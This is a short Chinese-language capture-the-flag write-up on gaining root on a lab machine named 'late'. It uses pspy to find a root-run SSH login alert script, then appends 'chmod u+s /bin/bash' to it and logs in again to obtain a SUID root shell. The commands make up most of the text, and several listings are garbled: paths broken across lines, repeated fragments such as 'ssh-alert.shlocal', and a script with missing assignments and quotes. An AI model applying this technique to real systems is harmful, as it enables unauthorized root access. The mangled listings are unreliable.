# 权限提升

首先运行一下 pspy

> https://github.com/DominicBreuker/pspy

![](../Images/aff7f7d640261aaa9b06b4b829e2eb79.png)

这里找到了一个定时任务脚本

```
/usr/local
/sbin/ssh-alert.sh
```

```

#!/bin/bash
"root@late.htb"
"Email from Server Login: SSH Alert"

"$PAM_USER
$PAM_RHOST
$PAM_SERVICE
$PAM_TTY

if [ ${PAM_TYPE} = "open_session" ]; then
echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

```

这是脚本的内容，咱们分析一下

```
svc_acc@late:~$ ls -la /usr/local
/sbin/ssh-alert.shlocal
/sbin/ssh-alert.shlocal
/sbin/ssh-alert.shlocal
/sbin/ssh-alert.sh
```

这里查看权限，咱们是可以将内容写到进去的

```
echo "chmod u+s /bin/bash" >> /usr/local
/sbin/ssh-alert.sh
```

咱们加一个 bash SUID，然后重新登录 ssh，接着执行提权命令

```
svc_acc@late:~$ echo "chmod u+s /bin/bash" >> /usr/local
/sbin/ssh-alert.shexit
logout

# ssh svc_acc@10.10.11.156 -i id_rsa

# id


```

成功拿到 root 权限
